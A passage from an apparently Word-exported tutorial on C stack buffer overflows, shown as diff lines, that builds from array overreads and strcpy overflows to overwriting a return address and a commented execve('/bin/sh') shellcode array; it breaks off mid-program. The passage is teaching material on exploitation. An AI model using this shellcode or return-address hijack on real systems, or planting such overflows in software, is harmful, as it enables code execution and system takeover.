+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>This is one more program to ascertain
+the fact that the array is not restricted to the size it is initialized to.
+Since a is merely a pointer to a location in memory, using the array syntax,
+the other areas in memory can easily be accessed. While doing some research on
+this topic we found out that the gcc compiler adds enough code to ensure a
+secure environment. Thus the return address is found at location 28,29,30,31. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>z.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>FILE *fp; int i;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fp =
+fopen(&quot;q10.txt&quot;,&quot;w&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>for ( i = 0 ; i&lt;= 7 ;
+i++)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fputc('A',fp);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fputc('B',fp);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fputc('B',fp);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fputc('B',fp);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fputc('B',fp);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fputc('C',fp);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fputc('D',fp);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fputc('E',fp);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fputc('F',fp);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoPlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>A file called q10.txt is
+opened for writing. Using the function fputc, which takes a character and the
+file pointer, 8 A’s are written on to disk using the for loop. Thereafter, a
+few more characters are written individually to the file.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>z1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>FILE *fp;char a[4];<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fp =
+fopen(&quot;q10.txt&quot;,&quot;r&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>fread(a,100,1,fp);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
+font-family:"Trebuchet MS";color:#000066'>The above program is a sequel to the previous
+one. It opens the file q10.txt and then reads the next 100 bytes into an array
+a. However, since the array is only 4 bytes large only 4 bytes are allocated to
+the array. Thus the first 4 A’s will be saved in the allocated array memory and
+thereafter it overwrites the stack area with the other characters. </span><span
+style='color:#000066'>The fread function in one go places all these bytes on
+the stack without realizing that it is overwriting the existing instruction
+thus causing a buffer overflow.</span><span style='mso-fareast-font-family:
+"MS Mincho";color:#000066'><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&gt;export VIJAY=`perl -e
+'print &quot;A&quot; x 200'`<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char *p;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>p =
+getenv(&quot;VIJAY&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%s\n&quot;,p);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>lots of A's<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char *p;char a[64];<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>p =
+getenv(&quot;VIJAY&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>strcpy(a,p);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>This program shows
+Segmentation fault since the registers have been overwritten.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int pqr()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;In
+pqr\n\n&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>exit(1);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;pqr=%p\n&quot;,pqr);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char a[3];<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[24]='B';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[25]='B';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[26]='B';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[27]='B';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[28]=0x5c;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[29]=0x83;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[30]=0x04;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[31]=0x08;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr=0x804835c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>In pqr<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Disassembled output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&gt;gdb a1<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>x/12b 0x8048338<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>0xb8<span
+style="mso-spacerun: yes">    </span>0x01<span style="mso-spacerun: yes">   
+</span>0x00<span style="mso-spacerun: yes">    </span>0x00<span
+style="mso-spacerun: yes">    </span>0x00<span style="mso-spacerun: yes">   
+</span>0xcd<span style="mso-spacerun: yes">    </span>0x80 <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Before calling function abc
+in main, we run the program as is to find out the address of function pqr. On
+our machine the address is 0x804835c. This value is then given in abc to the
+memory location 28,29,30,31. As seen in the earlier program, these location
+stores the return address of the code to be called when main ends. Now that it
+has been overwritten by the address of function pqr, pqr is called and hence we
+see the printf displaying In pqr. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The pqr function having exit
+has been shown in the disassembled form using the gdb debugger. Here 1 is moved
+in the eax register and then interrupt 80 is called.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;mov
+$1,%eax&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;int
+$0x80&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Bye\n&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The disassembled output of
+this program shows the assembler instruction for the exit function. These
+instructions are then placed into an array in the next program.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char p[] =
+&quot;\xb8\x01\x00\x00\x00\xcd\x80&quot;;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char (*q)();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>q = p;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Hi\n&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>q();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Bye\n&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Hi<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The array p holds the
+assembler instruction for the exit function. Q is now a pointer to function and
+is initialized to array p. On executing the program, the printf function displays
+Hi. Thereafter, code at address location q is executed. Since this code
+represents the exit function, the program terminates without displaying Bye.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char p[] =
+&quot;\xeb\x1d&quot;<span style="mso-spacerun: yes">   </span>/* jmp callz */<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>/* start: */<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\x5e&quot;<span
+style="mso-spacerun: yes">         </span>/* popl %esi<span
+style="mso-spacerun: yes">            </span><span style="mso-spacerun:
+yes">   </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\x29\xc0&quot;<span
+style="mso-spacerun: yes">     </span>/* subl %eax, %eax<span
+style="mso-spacerun: yes">         </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\x88\x46\x07&quot; /*
+movb %al, 0x07(%esi)<span style="mso-spacerun: yes">    </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\x89\x46\x0c&quot; /*
+movl %eax, 0x0c(%esi)<span style="mso-spacerun: yes">   </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\x89\x76\x08&quot; /*
+movl %esi, 0x08(%esi)<span style="mso-spacerun: yes">   </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\xb0\x0b&quot;<span
+style="mso-spacerun: yes">     </span>/* movb $0x0b, %al<span
+style="mso-spacerun: yes">         </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\x87\xf3&quot;<span
+style="mso-spacerun: yes">     </span>/* xchgl %esi, %ebx<span
+style="mso-spacerun: yes">        </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\x8d\x4b\x08&quot; /*
+leal 0x08(%ebx), %ecx<span style="mso-spacerun: yes">   </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\x8d\x53\x0c&quot; /*
+leal 0x0c(%ebx), %edx<span style="mso-spacerun: yes">   </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\xcd\x80&quot;<span
+style="mso-spacerun: yes">     </span>/* int $0x80<span style="mso-spacerun:
+yes">               </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\x29\xc0&quot;<span
+style="mso-spacerun: yes">     </span>/* subl %eax, %eax<span
+style="mso-spacerun: yes">         </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\x40&quot;<span
+style="mso-spacerun: yes">         </span>/* incl %eax<span
+style="mso-spacerun: yes">               </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\xcd\x80&quot; <span
+style="mso-spacerun: yes">    </span>/* int $0x80<span style="mso-spacerun:
+yes">               </span>*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>/* callz: */<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;\xe8\xde\xff\xff\xff&quot;
+/*call start*/<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>&quot;/bin/sh&quot;;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
